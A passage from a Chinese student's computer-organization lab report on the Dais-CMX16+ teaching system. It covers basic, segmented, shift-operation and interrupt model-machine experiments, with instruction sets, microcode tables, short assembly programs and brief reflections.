01</td><td>sta [RAM],r0</td><td>R0→RAM</td></tr><tr><td>007</td><td>80 01</td><td>out ioH,[RAM]</td><td>RAM→I/O奇字节</td></tr><tr><td>009</td><td>A0 00</td><td>jmp 000h</td><td>RAM→PC</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA080.tmp.jpg" alt="img"> </p><p>基本模型机微程序流程图</p><p><strong>5<strong><strong>．实验</strong></strong>方法</strong></p><p>打开——mxj1.asm,装载,微单步(无法联机时，跳过联机步骤，直接装载也可以做实验)</p><p>;基本模型机程序</p><p>#LOAD “MXJ1.IS”     ;预调入指令系统/微程序</p><p>#SET RAM 0260h = 5500h  ;数据区0260H单元预置数据5500h</p><p>data   segment     ;将程序装载到数据存储器</p><p>​    assume ds:data</p><p>​    org  0</p><p>start:  in   r0, iol</p><p>​    add  r0, 0260h</p><p>​    sta  0261h, r0</p><p>​    out  ioh, 0261h</p><p>​    jmp  start</p><p>data   ends</p><p>​    end  start</p><p>PC=AR，AR通过地址获得RAM中的数据。初始状态PC=0000.将PAM数据2040高位20置入IR=2020.I/O输入FFFF，将其置入CX=FFFF。PC=0001，将PAM数据2040低位40置入IR=4040。通过程序计数器PC不断加1，将数据存储器RAM中的数据调出。PC=0002，6002先调出高位60，PC+1，PC=0003，再调出低位02，BX=0260。AX=0000，运算器ALU计算FUN=0260，数据置入AR=0260，RAM=5500。55置入BX低位，BX=0255；CX值FF置入AX低位，，AX=00FF，运算器ALU计算FUN=0254。低位54置入CX低位，CX=FF54。PC+1，PC=0004，PC=AR，AR通过地址获得RAM中的数据6061，PC=0004,60置入IR=6060；PC=0005,61置入BX低位BX=0261；PC=0006，PC=AR，AR通过地址获得RAM中的数据0280。AX=00FF,BX=0261,运算器ALU计FUN=0261。</p><p><strong>6．实验心得</strong></p><p>姑且算是第一次使用软件模拟计算机进行计算机组成系统的实验吧，难度在于这个汇编语言的不了解，按照老师可上要求走的话并没有太大难度，但是总是感觉有些地方没有清楚。</p><p><strong>实验六  分段****模型机的设计与实现</strong></p><p><strong>1．实验目的</strong></p><p>（1） 在掌握基本模型机的基础上，构造一台含有段概念（程序与数据）分段寻址的模型机。</p><p>（2） 机器指令与基本模型机相同的情况下编写段式的微程序，上机调试掌握段概念运用。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台；</p><p>计算机一台。</p><p><strong>3．实验****原理</strong></p><p>在基本模型机的实践中，CPU的取指以AR作为地址指针，在微程序流程中必须要通过PC送AR这一途径完成操作码与操作数的存取，这种瓶颈现象降低了CPU的工作效率，仅适用于基础教学，与通用机的设计规范差距甚远。</p><p>目前通用机的规范寻址方式通常把存储器组织分为程序段、数据段、堆栈段……地址指针的定义由此分为程序指针、数据指针、堆栈指针等，进一步提高了CPU的工作效率。</p><p>段式模型机在取指时直接默认PC指针，完成操作码与操作数的存取。使我们的模型机设计“不存在”也“不需要”考虑指令预取的问题。</p><p><em><strong>*指令系统：*</strong></em></p><table><thead><tr><th>助记符</th><th>机器指令码</th><th>说明</th></tr></thead><tbody><tr><td>IN R0,IOL</td><td>00100000</td><td>i/o(数据开关)偶字节→r0</td></tr><tr><td>ADD R0,[addr]</td><td>01000000 XXXXXXXX XXXXXXXX</td><td>R0+[addr]→R0</td></tr><tr><td>STA [addr],R0</td><td>01100000 XXXXXXXX XXXXXXXX</td><td>R0→[addr]</td></tr><tr><td>OUT [addr],IOH</td><td>10000000 XXXXXXXX XXXXXXXX</td><td>RAM→i/o(奇字节)</td></tr><tr><td>JMP addr</td><td>10100000 XXXXXXXX XXXXXXXX</td><td>addr→PC</td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA086.tmp.jpg" alt="img"> </p><p>分段模型机数据通路</p><p>​    <img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA087.tmp.jpg" alt="img"></p><p>实验所用的机器指令程序</p><table><thead><tr><th>地址</th><th>指令代码</th><th>助记符</th><th>功能</th></tr></thead><tbody><tr><td>000</td><td>20</td><td>in r0,ioL</td><td>i/o(数据开关)偶字节→r0</td></tr><tr><td>001</td><td>40 60 02</td><td>add r0,[addr]</td><td>r0+RAM→r0</td></tr><tr><td>004</td><td>60 61 02</td><td>sta [addr],r0</td><td>r0→RAM</td></tr><tr><td>007</td><td>80 61 02</td><td>out [addr],ioH</td><td>RAM→i/o(奇字节)</td></tr><tr><td>00a</td><td>a0 00 00</td><td>jmp 000h</td><td>RAM→pc</td></tr></tbody></table><p><strong>4.</strong> <strong>实验****方法</strong></p><p>打开——mxj2.as,装载,微单步</p><table><thead><tr><th>微址00002)1)</th><th>M23</th><th>M22</th><th>M21</th><th>M20</th><th>M19</th><th>M18</th><th>M17</th><th>M16</th><th>代码</th><th>M15</th><th>M14</th><th>M13</th><th>M12</th><th>M11</th><th>M10</th><th>M9</th><th>M8</th><th>代码</th><th>M7</th><th>M6</th><th>M5</th><th>M4</th><th>M3</th><th>M2</th><th>M1</th><th>M0</th><th>代码</th><th>后续微址</th><th>说明</th></tr></thead><tbody><tr><td>E/M</td><td>IP</td><td>MWR</td><td>R/M</td><td>o2</td><td>o1</td><td>o0</td><td>OP</td><td>M</td><td>CN</td><td>S2</td><td>S2</td><td>S0</td><td>X2</td><td>X1</td><td>X0</td><td>XP</td><td>W</td><td>ALU</td><td>Iu</td><td>IE</td><td>IR</td><td>Icz</td><td>Ids</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>000</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>+1</td><td>空操作</td></tr><tr><td>001</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>可变</td><td>IBUS→IR</td></tr><tr><td>600</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td><td>0</td><td>5A</td><td>001</td><td>关中断</td></tr><tr><td>640</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>03</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>92</td><td>001</td><td>I/O→R0</td></tr><tr><td>680</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BL</td></tr><tr><td>681</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>44</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BH</td></tr><tr><td>682</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>F0</td><td>6A0</td><td>BX→AR</td></tr><tr><td>6A0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>85</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BL</td></tr><tr><td>6A1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>07</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>R0→AL</td></tr><tr><td>6A2</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>99</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>B2</td><td>001</td><td>A+B→R0</td></tr><tr><td>6C0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BL</td></tr><tr><td>6C1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>44</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BH</td></tr><tr><td>6C2</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>F0</td><td>6E0</td><td>BX→AR</td></tr><tr><td>6E0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>A0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>12</td><td>001</td><td>R0→RAM</td></tr><tr><td>700</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BL</td></tr><tr><td>701</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>44</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BH</td></tr><tr><td>702</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>F0</td><td>720</td><td>BX→AR</td></tr><tr><td>720</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>8A</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>12</td><td>001</td><td>RAM→I/O</td></tr><tr><td>740</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BL</td></tr><tr><td>741</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>30</td><td>760</td><td>RAM→BH</td></tr><tr><td>760</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>C0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>F2</td><td>001</td><td>BX→PC</td></tr><tr><td>780</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1A</td><td>001</td><td>开中断</td></tr><tr><td>7C0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>01</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>48</td><td>+1</td><td>IAQ清零</td></tr></tbody></table><p>;分段模型机程序</p><p>#LOAD “MXJ2.IS”     ;预调入指令系统/微程序</p><p>#SET RAM 0260h = 5500h  ;数据区0260H单元预置数据5500h</p><p>​    org  0</p><p>start:  in   r0, iol</p><p>​    add  r0, 0260h</p><p>​    sta  0261h, r0</p><p>​    out  ioh, 0261h</p><p>​    jmp  start</p><p>​    End</p><p> <strong>5．实验心得</strong></p><p>实验数据区0260H单元预置数据5500h，装载实验之后再将I/O端的低位数据置为44，执行微单步，程序计数器PC=0001，从程序去区读出2040，并将其赋予IR，继续执行微单步，此时执行add  r0, 0260h微指令，从I/O地址中读出低位数据44，将其付给CL，继续执行微单步，PC自增，程序微地址+600，来到add程序将ROM中的地址通过总线传输给BX，PC+1，BX读入0260H。此时继续执行微单步，通过BX将待读取的地址通过ALU送给AR,继续执行微单步，从数据区0260位置读取出数据，将55付给BX的第八位，继续执行微单步将CX中低八位数据44送给AX，ALU做加法运算，通过总线将数据送给CX的第八位，此时数据为99H，接着执行数次微单步，将CX中的数据赋值给数据区0260的低八位，程序运行结束后，此时的数据为5599.</p><p>实验确实不难，跟着程序走一遍就很清楚，但是具体的工作原理就是在一步步的执行微单步过程中，理解分段模型机程序每一次微单步下的活动。</p><p><strong>实验七  带移位运算的****模型机的设计与实现</strong></p><p><strong>1．实验目的</strong></p><p>（1） 编制模型机移位运算控制逻辑的CM存储项。</p><p>（2） 熟悉和掌握存储逻辑控制器的调试方法与步骤。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台；</p><p>计算机一台。</p><p><strong>3．实验****原理</strong></p><p>本实验在实验二（分段模型机）的基础上扩充移位控制指令，实现移位控制运算。</p><p>实验中新增4条移位运算指令：RL（左环移）、RLC（带进位左环移）、RR（右环移）、RRC（带进位右环移），其指令格式如下：</p><table><thead><tr><th><em><strong>*助记符*</strong></em></th><th><em><strong>*机器指令码*</strong></em></th><th><em><strong>*说明*</strong></em></th></tr></thead><tbody><tr><td><em><strong>*RR R0*</strong></em></td><td><em><strong>*01010000*</strong></em></td><td><em><strong>*R0寄存器内容右移*</strong></em></td></tr><tr><td><em><strong>*RRC R0*</strong></em></td><td><em><strong>*01110000*</strong></em></td><td><em><strong>*R0寄存器内容带进位右移*</strong></em></td></tr><tr><td><em><strong>*RL R0*</strong></em></td><td><em><strong>*00010000*</strong></em></td><td><em><strong>*R0寄存器内容左移*</strong></em></td></tr><tr><td><em><strong>*RLC IOH*</strong></em></td><td><em><strong>*00110000*</strong></em></td><td><em><strong>*R0寄存器内容带进位左移*</strong></em></td></tr></tbody></table><p><img src="file:///C:\Users\888888\AppData\Local\Temp\ksohtml\wpsA0AC.tmp.jpg" alt="img"> </p><p>分段模型机数据通路</p><p><strong>4.</strong> <strong>实验****方法</strong></p><p>;移位模型机程序</p><p>#LOAD “MXJ3.IS”  ;预调入指令系统/微程序</p><p>org  0</p><p>start:  in   r0, iol</p><p>add  r0, 00h</p><p>rrc  r0</p><p>rl   r0</p><p>sta  01h, r0</p><p>out  ioh, 01h</p><p>jmp  start</p><p>end</p><p><strong>5．实验心得</strong> </p><table><thead><tr><th>微址00002)1)</th><th>M23</th><th>M22</th><th>M21</th><th>M20</th><th>M19</th><th>M18</th><th>M17</th><th>M16</th><th>代码</th><th>M15</th><th>M14</th><th>M13</th><th>M12</th><th>M11</th><th>M10</th><th>M9</th><th>M8</th><th>代码</th><th>M7</th><th>M6</th><th>M5</th><th>M4</th><th>M3</th><th>M2</th><th>M1</th><th>M0</th><th>代码</th><th>后续微址</th><th>说明</th></tr></thead><tbody><tr><td>E/M</td><td>IP</td><td>MWR</td><td>R/M</td><td>o2</td><td>o1</td><td>o0</td><td>OP</td><td>M</td><td>CN</td><td>S2</td><td>S2</td><td>S0</td><td>X2</td><td>X1</td><td>X0</td><td>XP</td><td>W</td><td>ALU</td><td>Iu</td><td>IE</td><td>IR</td><td>Icz</td><td>Ids</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>000</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>+1</td><td>空操作</td></tr><tr><td>001</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>可变</td><td>IBUS→IR</td></tr><tr><td>600</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>12</td><td>001</td><td>空操作</td></tr><tr><td>620</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>07</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>R0→AL</td></tr><tr><td>621</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>89</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>B2</td><td>001</td><td>RL A→R0</td></tr><tr><td>640</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>03</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>92</td><td>001</td><td>I/O→R0</td></tr><tr><td>660</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>07</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>R0→A</td></tr><tr><td>661</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>1</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>A9</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>B2</td><td>001</td><td>RL A→R0</td></tr><tr><td>680</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>ROM→BL</td></tr><tr><td>681</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>E0</td><td>+1</td><td>BX→AR,PC+1</td></tr><tr><td>682</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>85</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>RAM→BL</td></tr><tr><td>683</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>07</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>R0→AL</td></tr><tr><td>684</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>1</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>99</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>B2</td><td>001</td><td>A+B→R0</td></tr><tr><td>6A0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>07</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>R0→A</td></tr><tr><td>6A1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>81</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>B2</td><td>001</td><td>RR A→R0</td></tr><tr><td>6C0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>ROM→BL</td></tr><tr><td>6C1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>E0</td><td>+1</td><td>BX→AR,PC+1</td></tr><tr><td>6C2</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>A0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>12</td><td>001</td><td>R0→RAM</td></tr><tr><td>6E0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>07</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>0</td><td>06</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>R0→A</td></tr><tr><td>6E1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0E</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>A1</td><td>1</td><td>0</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>B2</td><td>001</td><td>RR A→R0</td></tr><tr><td>700</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>ROM→BL</td></tr><tr><td>701</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>43</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>E0</td><td>+1</td><td>BX→AR,PC+1</td></tr><tr><td>702</td><td>1</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>8A</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>12</td><td>001</td><td>RAM→I/O</td></tr><tr><td>720</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>40</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>12</td><td>001</td><td>CY置1</td></tr><tr><td>740</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>1</td><td>05</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>04</td><td>0</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>20</td><td>+1</td><td>ROM→BL</td></tr><tr><td>741</td><td>1</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>C0</td><td>0</td><td>0</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>39</td><td>1</td><td>1</td><td>1</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>F2</td><td>001</td><td>BX→PC</td></tr><tr><td>760</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>00</td><td>0</td><td>1</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>0</td><td>40</td><td>0</td><td>1</td><td>0</td><td>1</td><td>0</td><td>0</td><td>1</td><td>0</td><td>52</td><td>001</td><td>BX→PC</td></tr></tbody></table><p><strong>实验八  中断****模型机的设计与实现</strong></p><p><strong>1．实验目的</strong></p><p>了解“中断源”的硬件构造，掌握中断源微控制流程，设计和实现中断源在模型机中的运用。</p><p><strong>2．实验设备</strong></p><p>Dais-CMX16+计算机组成原理教学实验系统一台；</p><p>计算机一台。</p><p><strong>3．指令系统</strong></p><table><thead><tr><th><em><strong>*助记符*</strong></em></th><th><em><strong>*机器指令码*</strong></em></th><th><em><strong>*说明*</strong></em></th></tr></thead><tbody><tr><td><em><strong>*IN R0,IOL*</strong></em></td><td><em><strong>*00100000*</strong></em></td><td><em><strong>*I/O(数据开关)偶字节→R0*</strong></em></td></tr><tr><td><em><strong>*ADD R0,[addr]*</strong></em></td><td><em><strong>*01010000 XXXXXXXX XXXXXXXX*</strong></em></td><td><em><strong>*R0+[addr]→R0*</strong></em></td></tr><tr><td><em><strong>*STA [addr],R0*</strong></em></td><td><em><strong>*01110000 XXXXXXXX XXXXXXXX*</strong></em></td><td><em><strong>*R0→[addr]*</strong></em></td></tr><tr><td><em><strong>*OUT [addr],IOH*</strong></em></td><td><em><strong>*10010000 